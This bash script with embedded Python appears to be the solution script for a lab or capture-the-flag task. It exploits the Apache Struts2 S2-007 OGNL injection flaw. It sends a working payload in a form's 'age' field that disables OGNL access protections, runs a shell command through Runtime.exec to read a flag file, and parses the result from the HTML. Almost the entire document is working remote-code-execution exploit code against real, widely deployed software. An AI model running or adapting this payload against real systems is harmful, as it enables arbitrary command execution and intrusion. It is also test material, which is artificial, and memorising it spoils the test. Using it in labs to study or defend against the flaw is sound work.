#!/bin/bash
set -e

URL_BASE="http://struts2:8080"

# Wait for service to be ready
wait_for_service() {
    echo "Waiting for Struts2 to be ready..."
    for i in {1..30}; do
        if curl -s -f "$URL_BASE/" > /dev/null 2>&1; then
            echo "Service is ready"
            return 0
        fi
        sleep 2
    done
    echo "Service failed to become ready"
    return 1
}

wait_for_service

# Exploit S2-007 OGNL injection via validation bypass
# When a validation error occurs, the submitted value is evaluated as OGNL
# We inject into the age field which expects an integer

python <<'PYTHON_EOF'
import urllib.parse
import urllib.request
import re
import sys

url = "http://struts2:8080/user.action"

# OGNL payload to execute command and capture output
payload = "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat /tmp/secret_flag.txt').getInputStream())) + '"

data = urllib.parse.urlencode({
    'name': 'test',
    'email': 'test@test.com',
    'age': payload
}).encode('utf-8')

try:
    response = urllib.request.urlopen(url, data)
    html = response.read().decode('utf-8')
    
    # Extract flag from value attribute of age input field
    match = re.search(r'name="age" value="([^"]*)"', html)
    if match:
        flag = match.group(1).strip()
        print(flag, flush=True)
    else:
        print("Error: Could not extract flag from response", file=sys.stderr, flush=True)
        sys.exit(1)
except Exception as e:
    print(f"Error: {e}", file=sys.stderr, flush=True)
    sys.exit(1)
PYTHON_EOF
